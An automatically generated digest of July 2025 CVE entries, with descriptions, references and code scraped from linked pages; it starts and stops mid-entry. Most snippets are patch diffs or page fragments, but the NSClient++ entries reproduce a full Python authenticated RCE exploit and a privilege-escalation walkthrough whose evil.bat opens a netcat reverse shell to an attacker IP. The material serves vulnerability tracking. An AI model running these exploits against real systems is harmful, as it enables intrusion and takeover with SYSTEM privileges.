Modified: 2025-07-03T15:13:53.147
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Multiple plugins for WordPress are vulnerable to Stored Cross-Site Scripting via the plugin's bundled Magnific Popups library (version 1.1.0) in various versions due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. NOTE: This vulnerability was fixed in the upstream library (Magnific Popups version 1.2.0) by disabling the loading of HTML within certain fields by default.

References (16):
  1. https://github.com/dimsemenov/Magnific-Popup/releases/tag/1.2.0
  2. https://plugins.trac.wordpress.org/browser/bold-page-builder/trunk/content_elements_misc/js/jquery.magnific-popup.js
  3. https://plugins.trac.wordpress.org/browser/essential-addons-for-elementor-lite/trunk/assets/front-end/js/lib-view/magnific-popup/jquery.magnific-popup.js
  4. https://plugins.trac.wordpress.org/browser/robo-gallery/trunk/js/robo_gallery.js#L56
  5. https://plugins.trac.wordpress.org/browser/shortcodes-ultimate/trunk/vendor/magnific-popup/magnific-popup.js
  6. https://plugins.trac.wordpress.org/changeset/3153700/essential-addons-for-elementor-lite
  7. https://plugins.trac.wordpress.org/changeset/3153781/bold-page-builder
  8. https://plugins.trac.wordpress.org/changeset/3154460/happy-elementor-addons
  9. https://plugins.trac.wordpress.org/changeset/3166204/carousel-slider
  10. https://plugins.trac.wordpress.org/changeset/3184626/addons-for-divi

Attempting to extract code examples from references...

--- Code from https://github.com/dimsemenov/Magnific-Popup/releases/tag/1.2.0 ---
allowHTMLInStatusIndicator

allowHTMLInTemplate

<span class="pl-en">$</span><span class="pl-kos">(</span><span class="pl-s">'.gallery'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-en">magnificPopup</span><span class="pl-kos">(</span><span class="pl-kos">{</span>
  <span class="pl-c1">allowHTMLInStatusIndicator</span>: <span class="pl-c1">true</span><span class="pl-kos">,</span>
  <span class="pl-c1">allowHTMLInTemplate</span>: <span class="pl-c1">true</span><span class="pl-kos">,</span>
  <span class="pl-c">// ...</span>
<span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">;</span>

================================================================================


CVE ID: CVE-2025-52559
Published: 2025-07-02T20:15:31.443
Modified: 2025-08-27T13:37:33.070
CVSS Score: 6.8 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Zulip is an open-source team chat application. From versions 2.0.0-rc1 to before 10.4 in Zulip Server, the /digest/ URL of a server shows a preview of what the email weekly digest would contain. This URL, though not the digest itself, contains a cross-site scripting (XSS) vulnerability in both topic names and channel names. This issue has been fixed in Zulip Server 10.4. A workaround for this issue involves denying access to /digest/.

References (4):
  1. https://github.com/zulip/zulip/commit/175ec1f365b0db982d6eac9019701cbf6e8bc2f2 [Patch]
  2. https://github.com/zulip/zulip/commit/1a8429e338ff53bdcc4b42e7e71b6fffdd84fcd1 [Patch]
  3. https://github.com/zulip/zulip/commit/6608c8777254e73a4b540e5e1c4af92e680a55fc [Patch]
  4. https://github.com/zulip/zulip/security/advisories/GHSA-vgf2-vw4r-m663 [Patch, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/zulip/zulip/commit/175ec1f365b0db982d6eac9019701cbf6e8bc2f2 ---
From 175ec1f365b0db982d6eac9019701cbf6e8bc2f2 Mon Sep 17 00:00:00 2001
From: Anders Kaseorg <anders@zulip.com>
Date: Mon, 23 Jun 2025 16:28:17 -0700
Subject: [PATCH] CVE-2025-52559: Generate HTML for digest new channels safely.

Signed-off-by: Anders Kaseorg <anders@zulip.com>
---
 zerver/lib/digest.py    |  7 +++++--
 zerver/lib/templates.py | 14 ++++++++------
 2 files changed, 13 insertions(+), 8 deletions(-)

diff --git a/zerver/lib/digest.py b/zerver/lib/digest.py
index 20ee0fc7bcdd3..af66de4d055c4 100644
--- a/zerver/lib/digest.py
+++ b/zerver/lib/digest.py
@@ -11,6 +11,7 @@
 from django.db.models import Exists, OuterRef, QuerySet
 from django.utils.timezone import now as timezone_now
 from django.utils.translation import gettext as _
+from markupsafe import Markup
 
 from confirmation.models import one_click_unsubscribe_link
 from zerver.context_processors import common_context
@@ -250,7 +251,7 @@ def gather_new_streams(
     realm: Realm,
     recently_created_streams: list[Stream],  # streams only need id and name
     can_access_public: bool,
-) -> tuple[int, dict[str, list[str]]]:
+) -> tuple[int, dict[str, list[Markup] | list[str]]]:
     if can_access_public:
         new_streams = [stream for stream in recently_created_streams if not stream.invite_only]
     else:
@@ -261,7 +262,9 @@ def gather_new_streams(
 
     for stream in new_streams:
         narrow_url = stream_narrow_url(realm, stream)
-        channel_link = f"<a href='{narrow_url}'>{stream.name}</a>"
+        channel_link = Markup("<a href='{narrow_url}'>{stream_name}</a>").format(
+            narrow_url=narrow_url, stream_name=stream.name
+        )
         channels_html.append(channel_link)
         channels_plain.append(stream.name)
 
diff --git a/zerver/lib/templates.py b/zerver/lib/templates.py
index 73cb8480dd559..696c76b4fb51d 100644
--- a/zerver/lib/templates.py
+++ b/zerver/lib/templates.py
@@ -12,6 +12,7 @@
 from django.template import Library, engines
 from django.template.backends.jinja2 import Jinja2
 from django.utils.safestring import mark_safe
+from markupsafe import Markup
 
 import zerver.lib.markdown.api_arguments_table_generator
 import zerver.lib.markdown.api_return_values_table_generator
@@ -29,7 +30,7 @@
 register = Library()
 
 
-def and_n_others(values: list[str], limit: int) -> str:
+def and_n_others(values: list[str | Markup], limit: int) -> str | Markup:
     # A helper for the commonly appended "and N other(s)" string, with
     # the appropriate pluralization.
     return " and {} other{}".format(
@@ -39,7 +40,7 @@ def and_n_others(values: list[str], limit: int) -> str:
 
 
 @register.filter(name="display_list", is_safe=True)
-def display_list(values: list[str], display_limit: int) -> str:
+def display_list(values: list[str | Markup], display_limit: int) -> str | Markup:
     """
     Given a list of values, return a string nicely formatting those values,
     summarizing when you have more than `display_limit`. Eg, for a
@@ -51,16 +52,17 @@ def display_list(values: list[str], display_limit: int) -> str:
     Jessica, Waseem, Tim, and 1 other
     Jessica, Waseem, Tim, and 2 others
     """
+    sep = Markup(", ") if any(isinstance(value, Markup) for value in values) else ", "
     if len(values) == 1:
         # One value, show it.
-        display_string = f"{values[0]}"
+        display_string = values[0]
     elif len(values) <= display_limit:
         # Fewer than `display_limit` values, show all of them.
-        display_string = ", ".join(f"{value}" for value in values[:-1])
-        display_string += f" and {values[-1]}"
+        display_string = sep.join(value for value in values[:-1])
+        display_string += " and " + values[-1]
     else:
         # More than `display_limit` values, only mention a few.
-        display_string = ", ".join(f"{value}" for value in values[:display_limit])
+        display_string = sep.join(value for value in values[:display_limit])
         display_string += and_n_others(values, display_limit)
 
     return display_string


================================================================================


CVE ID: CVE-2025-34079
Published: 2025-07-02T20:15:29.963
Modified: 2025-09-16T19:53:27.970
CVSS Score: 7.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-306: Missing Authentication for Critical Function
  - CWE-94: Improper Control of Generation of Code ('Code Injection')

Description:
An authenticated remote code execution vulnerability exists in NSClient++ version 0.5.2.35 when the web interface and ExternalScripts module are enabled. A remote attacker with the administrator password can authenticate to the web interface (default port 8443), inject arbitrary commands as external scripts via the /settings/query.json API, save the configuration, and trigger the script via the /query/{name} endpoint. The injected commands are executed with SYSTEM privileges, enabling full remote compromise.

This capability is an intended feature, but the lack of safeguards or privilege separation makes it risky when exposed to untrusted actors.

References (3):
  1. https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/http/nscp_authenticated_rce.rb [Exploit]
  2. https://vulncheck.com/advisories/nsclient-localtoremote-system-compromise [Exploit, Third Party Advisory]
  3. https://www.exploit-db.com/exploits/48360 [Exploit, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://www.exploit-db.com/exploits/48360 ---
<code class="language-txt" style="white-space: pre-wrap;"># Exploit Title: NSClient++ 0.5.2.35 - Authenticated Remote Code Execution
# Google Dork: N/A
# Date: 2020-04-20
# Exploit Author: kindredsec
# Vendor Homepage: https://nsclient.org/
# Software Link: https://nsclient.org/download/
# Version: 0.5.2.35
# Tested on: Microsoft Windows 10 Pro (x64)
# CVE: N/A
#
# NSClient++ is a monitoring agent that has the option to run external scripts.
# This feature can allow an attacker, given they have credentials, the ability to execute
# arbitrary code via the NSClient++ web application. Since it runs as NT Authority/System bt
# Default, this leads to privileged code execution.

#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup as bs
import urllib3
import json
import sys
import random
import string
import time
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generateName():

	letters = string.ascii_lowercase + string.ascii_uppercase
	return &#039;&#039;.join(random.choice(letters) for i in range(random.randint(8,13)))

def printStatus(message, msg_type):

	C_YELLOW = &#039;\033[1;33m&#039;
	C_RESET = &#039;\033[0m&#039;
	C_GREEN = &#039;\033[1;32m&#039;
	C_RED = &#039;\033[1;31m&#039;

	if msg_type == &quot;good&quot;:
		green_plus = C_GREEN + &quot;[+]&quot; + C_RESET 
		string = green_plus + &quot; &quot; + message

	elif msg_type == &quot;info&quot;:
		yellow_ex = C_YELLOW + &quot;[!]&quot; + C_RESET
		string = yellow_ex + &quot; &quot; + message
	
	elif msg_type == &quot;bad&quot;:
		red_minus = C_RED + &quot;[-]&quot; + C_RESET
		string = red_minus + &quot; &quot; + message

	print(string)


# This function adds a new external script containing the desired
# command, then saves the configuration
def configurePayload(session, cmd, key):

	printStatus(&quot;Configuring Script with Specified Payload . . .&quot;, &quot;info&quot;)
	endpoint = &quot;/settings/query.json&quot;
	node = { &quot;path&quot; : &quot;/settings/external scripts/scripts&quot;,
		 &quot;key&quot; : key } 
	value = { &quot;string_data&quot; :  cmd }
	update = { &quot;node&quot; : node , &quot;value&quot; : value }
	payload = [ { &quot;plugin_id&quot; : &quot;1234&quot;,
		    &quot;update&quot; :  update } ] 
	json_data = { &quot;type&quot; : &quot;SettingsRequestMessage&quot;, &quot;payload&quot; : payload }

	out = session.post(url = base_url + endpoint, json=json_data, verify=False)
	if &quot;STATUS_OK&quot; not in str(out.content):
		printStatus(&quot;Error configuring payload. Hit error at: &quot;  + endpoint, &quot;bad&quot;)
		sys.exit(1)

	printStatus(&quot;Added External Script (name: &quot; + key + &quot;)&quot;, &quot;good&quot;)
	time.sleep(3)
	printStatus(&quot;Saving Configuration . . .&quot;, &quot;info&quot;)
	header = { &quot;version&quot; : &quot;1&quot; }
	payload = [ { &quot;plugin_id&quot; : &quot;1234&quot;, &quot;control&quot; : { &quot;command&quot; : &quot;SAVE&quot; }} ]
	json_data = { &quot;header&quot; : header, &quot;type&quot; : &quot;SettingsRequestMessage&quot;, &quot;payload&quot; : payload }
	
	session.post(url = base_url + endpoint, json=json_data, verify=False)	


# Since the application needs to be restarted after making changes,
# this function reloads the application, and waits for it to come back.
def reloadConfig(session):

	printStatus(&quot;Reloading Application . . .&quot;, &quot;info&quot;)
	endpoint = &quot;/core/reload&quot;
	session.get(url = base_url + endpoint, verify=False)
	
	# Wait until the application successfully reloads by making a request
	# every 10 seconds until it responds.
	printStatus(&quot;Waiting for Application to reload . . .&quot;, &quot;info&quot;)
	time.sleep(10)
	response = False
	count = 0 
	while not response:
		try:
			out = session.get(url = base_url, verify=False, timeout=10)
			if len(out.content) &gt; 0:
				response = True
		except:
			count += 1
			if count &gt; 10:
				printStatus(&quot;Application failed to reload. Nice DoS exploit! /s&quot;, &quot;bad&quot;)
				sys.exit(1)
			else:
				continue	


# This function makes the call to the new external script to
# ultimately execute the code.
def triggerPayload(session, key):

	printStatus(&quot;Triggering payload, should execute shortly . . .&quot;, &quot;info&quot;)
	endpoint = &quot;/query/&quot; + key
	try:
		session.get(url = base_url + endpoint, verify=False, timeout=10)
	except requests.exceptions.ReadTimeout:
		printStatus(&quot;Timeout exceeded. Assuming your payload executed . . .&quot;, &quot;info&quot;)
		sys.exit(0)


# Before setting up the exploit, this function makes sure the
# required feature (External Scripts) is enabled on the application.
def enableFeature(session):

	printStatus(&quot;Enabling External Scripts Module . . .&quot;, &quot;info&quot;)
	endpoint = &quot;/registry/control/module/load&quot;
	params = { &quot;name&quot; : &quot;CheckExternalScripts&quot; }
	out = session.get(url = base_url + endpoint, params=params, verify=False)
	if &quot;STATUS_OK&quot; not in str(out.content):
		printStatus(&quot;Error enabling required feature. Hit error at: &quot;  + endpoint, &quot;bad&quot;)
		sys.exit(1)


# This function obtains an authentication token that gets added to all
# remaining headers.
def getAuthToken(session):

	printStatus(&quot;Obtaining Authentication Token . . .&quot;, &quot;info&quot;)
	endpoint = &quot;/auth/token&quot;
	params = { &quot;password&quot; : password }
	auth = session.get(url = base_url + endpoint, params=params, verify=False)	
	if &quot;auth token&quot; in str(auth.content):
		j = json.loads(auth.content)
		authToken = j[&quot;auth token&quot;]
		printStatus(&quot;Got auth token: &quot; + authToken, &quot;good&quot;)
		return authToken
	else:
		printStatus(&quot;Error obtaining auth token, is your password correct? Hit error at: &quot;  + endpoint, &quot;bad&quot;)
		sys.exit(1)
		


parser = argparse.ArgumentParser(&quot;NSClient++ 0.5.2.35 Authenticated RCE&quot;)
parser.add_argument(&#039;-t&#039;, nargs=&#039;?&#039;, metavar=&#039;target&#039;, help=&#039;Target IP Address.&#039;)
parser.add_argument(&#039;-P&#039;, nargs=&#039;?&#039;, metavar=&#039;port&#039;, help=&#039;Target Port.&#039;)
parser.add_argument(&#039;-p&#039;, nargs=&#039;?&#039;, metavar=&#039;password&#039;, help=&#039;NSClient++ Administrative Password.&#039;)
parser.add_argument(&#039;-c&#039;, nargs=&#039;?&#039;, metavar=&#039;command&#039;, help=&#039;Command to execute on target&#039;)
args = parser.parse_args()

if len(sys.argv) &lt; 4:
	parser.print_help()
	sys.exit(1)

# Build base URL, grab needed arguments
base_url = &quot;https://&quot; + args.t + &quot;:&quot; + args.P
printStatus(&quot;Targeting base URL &quot; + base_url, &quot;info&quot;)
password = args.p
cmd = args.c

# Get first auth token, and add it to headers of session
s = requests.session()
token = getAuthToken(s)
s.headers.update({ &quot;TOKEN&quot; : token})

# Generate a random name, enable the feature, add the payload,
# then reload.
randKey = generateName()
enableFeature(s)
configurePayload(s, cmd, randKey)
reloadConfig(s)

# Since application was reloaded, need a new auth token.
token = getAuthToken(s)
s.headers.update({ &quot;TOKEN&quot; : token})

# Execute our code.
triggerPayload(s, randKey)
            

================================================================================


CVE ID: CVE-2025-34078
Published: 2025-07-02T20:15:29.827
Modified: 2025-09-17T13:32:50.920
CVSS Score: 7.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-269: Improper Privilege Management
  - CWE-312: Cleartext Storage of Sensitive Information
  - CWE-522: Insufficiently Protected Credentials

Description:
A local privilege escalation vulnerability exists in NSClient++ 0.5.2.35 when both the web interface and ExternalScripts features are enabled. The configuration file (nsclient.ini) stores the administrative password in plaintext and is readable by local users. By extracting this password, an attacker can authenticate to the NSClient++ web interface (typically accessible on port 8443) and abuse the ExternalScripts plugin to inject and execute arbitrary commands as SYSTEM by registering a custom script, saving the configuration, and triggering it via the API.

This behavior is documented but insecure, as the plaintext credential exposure undermines access isolation between local users and administrative functions.

References (4):
  1. https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/local/nscp_pe.rb [Exploit, Third Party Advisory]
  2. https://vulncheck.com/advisories/nsclient-localtoremote-system-compromise [Exploit, Third Party Advisory]
  3. https://www.exploit-db.com/exploits/46802 [Exploit, VDB Entry, Third Party Advisory]
  4. https://www.exploit-db.com/exploits/48360 [Exploit, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://www.exploit-db.com/exploits/46802 ---
<code class="language-txt" style="white-space: pre-wrap;">Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator&#039;s password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn&#039;t seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\Program Files\NSClient++&gt;nscp web -- password --display
	Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
	@echo off
	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
	nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings &gt; External Scripts &gt; Scripts
- Add New
	- foobar
		command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings &gt; Scheduler &gt; Schedules
- Add new
	- foobar
		interval = 1m
		command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
	nc -nlvvp 443
	listening on [any] 443 ...
	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
	Microsoft Windows [Version 10.0.17134.753]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\Program Files\NSClient++&gt;whoami
	whoami
	nt authority\system
	
Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System
            

================================================================================


CVE ID: CVE-2025-34076
Published: 2025-07-02T20:15:29.690
Modified: 2025-08-20T03:05:09.630
CVSS Score: 7.2 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
An authenticated local file inclusion vulnerability exists in Microweber CMS versions <= 1.2.11 through misuse of the backup management API. Authenticated users can abuse the /api/BackupV2/upload and /api/BackupV2/download endpoints to read arbitrary files from the underlying filesystem. By specifying an absolute file path in the src parameter of the upload request, the server may relocate or delete the target file depending on the web service user’s privileges. The corresponding download endpoint can then be used to retrieve the file contents, effectively enabling local file disclosure. This behavior stems from insufficient validation of user-supplied paths and inadequate restrictions on file access and backup logic.

References (7):
  1. https://github.com/microweber/microweber [Product]
  2. https://github.com/microweber/microweber/commit/572bdc36b5b47923790016f6b961c8df53226855 [Patch]
  3. https://github.com/microweber/microweber/commit/98d025467128ecc24195dcb56c533febc3c91af6 [Patch]
  4. https://huntr.com/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b [Exploit, Third Party Advisory]
  5. https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/auxiliary/gather/microweber_lfi.rb [Exploit]
  6. https://vulncheck.com/advisories/microweber-cms-lfi [Third Party Advisory]
  7. https://huntr.com/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/microweber/microweber ---
lib-xml

GD

intl

================================================================================


CVE ID: CVE-2025-20309
Published: 2025-07-02T17:15:52.927
Modified: 2025-07-03T15:23:28.870
CVSS Score: 10.0 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-798: Use of Hard-coded Credentials

Description:
A vulnerability in Cisco Unified Communications Manager (Unified CM) and Cisco Unified Communications Manager Session Management Edition (Unified CM SME) could allow an unauthenticated, remote attacker to log in to an affected device using the root account, which has default, static credentials that cannot be changed or deleted.

This vulnerability is due to the presence of static user credentials for the root account that are reserved for use during development. An attacker could exploit this vulnerability by using the account to log in to an affected system. A successful exploit could allow the attacker to log in to the affected system and execute arbitrary commands as the root user.

References (1):
  1. https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssh-m4UBdpE7 [Patch, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cucm-ssh-m4UBdpE7 ---
cucm1# file get activelog syslog/secure

Apr 6 10:38:43 cucm1 authpriv 6 systemd: pam_unix(systemd-user:session): session opened for user root by (uid=0)<br>Apr 6 10:38:43 cucm1 authpriv 6 <strong><span style="font-family: monospace;">sshd</span></strong>: pam_unix(sshd:session): session opened for user <strong><span style="font-family: monospace;">root</span></strong> by (uid=0)

================================================================================


CVE ID: CVE-2025-6943
Published: 2025-07-02T16:15:30.060
Modified: 2025-07-03T15:13:53.147
CVSS Score: 3.8 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-269: Improper Privilege Management

Description:
Secret Server version 11.7 and earlier is vulnerable to a SQL report creation vulnerability that allows an administrator to gain access to restricted tables.

References (4):
  1. https://docs.delinea.com/online-help/secret-server-changelog/secret-server-change-log.htm?cshid=secret-server-changelog#Friday,_November_22,_2024
  2. https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000060.htm
  3. https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000061.htm
  4. https://trust.delinea.com

Attempting to extract code examples from references...

--- Code from https://docs.delinea.com/online-help/secret-server-changelog/secret-server-change-log.htm?cshid=secret-server-changelog#Friday,_November_22,_2024 ---
cloudadmin

NEW!

Experience the next generation of <span class="mc-variable global-vars.SecretServer variable">Secret Server</span>

================================================================================


CVE ID: CVE-2025-6942
Published: 2025-07-02T16:15:29.883
Modified: 2025-07-03T15:13:53.147
CVSS Score: 3.8 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-639: CWE-639

Description:
The distributed engine versions 8.4.39.0 and earlier of Secret Server versions 11.7.49 and earlier can be exploited during an initial authorization event that would allow an attacker to impersonate another distributed engine.

References (4):
  1. https://docs.delinea.com/online-help/secret-server-changelog/secret-server-change-log.htm?cshid=secret-server-changelog#Friday,_November_22,_2024
  2. https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000060.htm
  3. https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000061.htm
  4. https://trust.delinea.com/?tcuUid=2b68edca-7930-438d-b960-2d6da07cdde9

Attempting to extract code examples from references...

--- Code from https://docs.delinea.com/online-help/secret-server-changelog/secret-server-change-log.htm?cshid=secret-server-changelog#Friday,_November_22,_2024 ---
cloudadmin

NEW!

Experience the next generation of <span class="mc-variable global-vars.SecretServer variable">Secret Server</span>

================================================================================


CVE ID: CVE-2025-53358
Published: 2025-07-02T16:15:29.280
Modified: 2025-07-03T15:13:53.147
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
kotaemon is an open-source RAG-based tool for document comprehension. From versions 0.10.6 and prior, in libs/ktem/ktem/index/file/ui.py, the index_fn method accepts both URLs and local file paths without validation. The pipeline streams these paths directly and stores them, enabling attackers to traverse directories (e.g. ../../../../../.env) and exfiltrate sensitive files. This issue has been patched via commit 37cdc28, in version 0.10.7 which has not been made public at time of publication.

References (3):
  1. https://github.com/Cinnamon/kotaemon/commit/37cdc28ceb46e505d25221584daf1fe61e26b2cc
  2. https://github.com/Cinnamon/kotaemon/pull/755
  3. https://github.com/Cinnamon/kotaemon/security/advisories/GHSA-jw4w-xcvf-jq5x

Attempting to extract code examples from references...

--- Code from https://github.com/Cinnamon/kotaemon/commit/37cdc28ceb46e505d25221584daf1fe61e26b2cc ---
From 37cdc28ceb46e505d25221584daf1fe61e26b2cc Mon Sep 17 00:00:00 2001
From: Khoi-Nguyen Nguyen-Ngoc <146712657+cin-niko@users.noreply.github.com>
Date: Wed, 2 Jul 2025 14:50:40 +0700
Subject: [PATCH] fix: add validation to avoid path-traversal vulnerabilities
 (#755)

* fix: add validation to avoid path-traversal vulnerabilities

* fix: update init value is_safe

Co-authored-by: Copilot <175728472+Copilot@users.noreply.github.com>

* refactor: extract zip check

* fix: dont need to check relative path

* fix: disable check zip file (zipfile have taken it)

---------

Co-authored-by: kan_cin <kan@cinnamon.is>
Co-authored-by: Copilot <175728472+Copilot@users.noreply.github.com>
Co-authored-by: phv2312 <kat87yb@gmail.com>
---
 libs/ktem/ktem/index/file/ui.py | 33 +++++++++++++++++++++++----------
 1 file changed, 23 insertions(+), 10 deletions(-)

diff --git a/libs/ktem/ktem/index/file/ui.py b/libs/ktem/ktem/index/file/ui.py
index 410e3157..deb1ac34 100644
--- a/libs/ktem/ktem/index/file/ui.py
+++ b/libs/ktem/ktem/index/file/ui.py
@@ -1059,15 +1059,18 @@ def _may_extract_zip(self, files, zip_dir: str):
         """Handle zip files"""
         zip_files = [file for file in files if file.endswith(".zip")]
         remaining_files = [file for file in files if not file.endswith("zip")]
+        errors: list[str] = []
 
         # Clean-up <zip_dir> before unzip to remove old files
         shutil.rmtree(zip_dir, ignore_errors=True)
 
+        # Unzip
         for zip_file in zip_files:
             # Prepare new zip output dir, separated for each files
             basename = os.path.splitext(os.path.basename(zip_file))[0]
             zip_out_dir = os.path.join(zip_dir, basename)
             os.makedirs(zip_out_dir, exist_ok=True)
+
             with zipfile.ZipFile(zip_file, "r") as zip_ref:
                 zip_ref.extractall(zip_out_dir)
 
@@ -1084,7 +1087,7 @@ def _may_extract_zip(self, files, zip_dir: str):
         if n_zip_file > 0:
             print(f"Update zip files: {n_zip_file}")
 
-        return remaining_files
+        return remaining_files, errors
 
     def index_fn(
         self, files, urls, reindex: bool, settings, user_id
@@ -1100,20 +1103,22 @@ def index_fn(
         """
         if urls:
             files = [it.strip() for it in urls.split("\n")]
-            errors = []
+            errors = self.validate_urls(files)
         else:
             if not files:
                 gr.Info("No uploaded file")
                 yield "", ""
                 return
+            files, unzip_errors = self._may_extract_zip(
+                files, flowsettings.KH_ZIP_INPUT_DIR
+            )
+            errors = self.validate_files(files)
+            errors.extend(unzip_errors)
 
-            files = self._may_extract_zip(files, flowsettings.KH_ZIP_INPUT_DIR)
-
-            errors = self.validate(files)
-            if errors:
-                gr.Warning(", ".join(errors))
-                yield "", ""
-                return
+        if errors:
+            gr.Warning(", ".join(errors))
+            yield "", ""
+            return
 
         gr.Info(f"Start indexing {len(files)} files...")
 
@@ -1569,7 +1574,7 @@ def interact_group_list(self, list_groups, ev: gr.SelectData):
             selected_item["files"],
         )
 
-    def validate(self, files: list[str]):
+    def validate_files(self, files: list[str]):
         """Validate if the files are valid"""
         paths = [Path(file) for file in files]
         errors = []
@@ -1598,6 +1603,14 @@ def validate(self, files: list[str]):
 
         return errors
 
+    def validate_urls(self, urls: list[str]):
+        """Validate if the urls are valid"""
+        errors = []
+        for url in urls:
+            if not url.startswith("http") and not url.startswith("https"):
+                errors.append(f"Invalid url `{url}`")
+        return errors
+
 
 class FileSelector(BasePage):
     """File selector UI in the Chat page"""


================================================================================


CVE ID: CVE-2025-6725
Published: 2025-07-02T15:15:28.523
Modified: 2025-07-03T15:13:53.147
CVSS Score: 5.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
In the PdfViewer component, a Cross-Site Scripting (XSS) vulnerability is possible if a specially-crafted document has already been loaded and the user engages with a tool that requires the DOM to be re-rendered.

References (6):
  1. https://www.telerik.com/aspnet-core-ui/documentation/knowledge-base/kb-security-pdfviewer-xss-cve-2025-6725
  2. https://www.telerik.com/aspnet-mvc/documentation/knowledge-base/kb-security-pdfviewer-xss-cve-2025-6725
  3. https://www.telerik.com/blazor-ui/documentation/knowledge-base/pdfviewer-xss-vulnerability-cve-2025-6725
  4. https://www.telerik.com/kendo-angular-ui/components/knowledge-base/kb-security-pdfviewer-xss-cve-2025-6725
  5. https://www.telerik.com/kendo-jquery-ui/documentation/knowledge-base/kb-security-pdfviewer-xss-cve-2025-6725
  6. https://www.telerik.com/kendo-react-ui/components/knowledge-base/kb-security-pdfviewer-xss-cve-2025-6725

Attempting to extract code examples from references...

--- Code from https://www.telerik.com/aspnet-core-ui/documentation/knowledge-base/kb-security-pdfviewer-xss-cve-2025-6725 ---
&gt;= v2024.4.1112

&lt;= v2025.2.520

&gt;= v2025.2.702

================================================================================


CVE ID: CVE-2025-52891
Published: 2025-07-02T15:15:27.177
Modified: 2025-07-03T15:13:53.147
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-20: Improper Input Validation

Description:
